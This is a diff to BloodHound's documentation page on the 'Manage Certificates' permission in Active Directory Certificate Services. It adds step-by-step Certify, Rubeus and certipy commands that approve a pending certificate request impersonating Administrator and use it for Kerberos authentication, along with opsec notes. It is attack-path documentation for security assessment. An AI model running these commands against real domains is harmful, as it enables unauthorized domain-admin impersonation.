@@ -5,27 +5,56 @@ description: The principal has the "Manage Certificates", also known as "CA Offi
 
 <img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
 
-This permission allows the principal to force the CA to issue certificates that the CA had previously denied issuance of.
+This permission allows the principal to approve certificate requests that require manager approval and to modify certain properties (e.g., adding extensions to pending certificates). It does not by itself guarantee a privilege escalation but often removes a final barrier (manager approval) in ADCS abuse paths.
 
-Abuse Info[](#h_01HPHZJSTFS46D4BFVYAB25KTE)
--------------------------------------------
+## Abuse Info
 
-This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge.
+An attacker can identify ADCS escalation opportunities where manager approval on a template prevents direct abuse, but leverage the Certificate Manager role to approve the pending request. Alternatively, the role can be abused to add an extension to pending certificates (e.g., to insert a group-linked issuance policy in environments using Authentication Mechanism Assurance (AMA)). See [Certify wiki - Escalation Techniques - ManageCertificates](https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#managecertificates) for details.
 
-Opsec Considerations[](#heading-2)
-----------------------------------
+### Windows
 
-When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate.
+Request a certificate that requires manager approval (example ESC1 scenario):
+```cmd
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500
+```
+Note the printed private key and request ID. Approve the certificate:
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --issue-id 1337
+```
+Download the issued certificate with the embedded private key (Base64 PFX):
+```cmd
+Certify.exe request-download --ca ca01.corp.local\CORP-CA01-CA --id 1337 --private-key <Base64PrivateKey>
+```
+Authenticate using the certificate (Rubeus example):
+```cmd
+Rubeus.exe asktgt /user:Administrator /certificate:<Base64PFX> /ptt
+```
 
-References[](#heading-3)
-------------------------
+### Linux
+
+Approve a pending request:
+```bash
+certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password 'Passw0rd'
+```
+Retrieve the issued certificate:
+```bash
+certipy req -username john@corp.local -password 'Passw0rd' -ca corp-DC-CA -target ca.corp.local -retrieve 785
+```
+
+## Opsec Considerations
+
+Approving requests generates issuance events and stores issued certificates on the CA host. Repeated approvals or unusual patterns (e.g., high-value templates) may be monitored. Added extensions or policy changes may be auditable depending on CA logging configuration.
+
+## References
 
 This edge is related to the following MITRE ATT&CK tactic and techniques:
 
-* https://attack.mitre.org/techniques/T1649/
+* [T1649: Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
 
 ### Abuse and Opsec references
 
-* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [Certify wiki - Escalation Techniques - ManageCertificates](https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#managecertificates)
+* [ESC7: Dangerous Permissions on CA (Certipy wiki)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca)
 
 
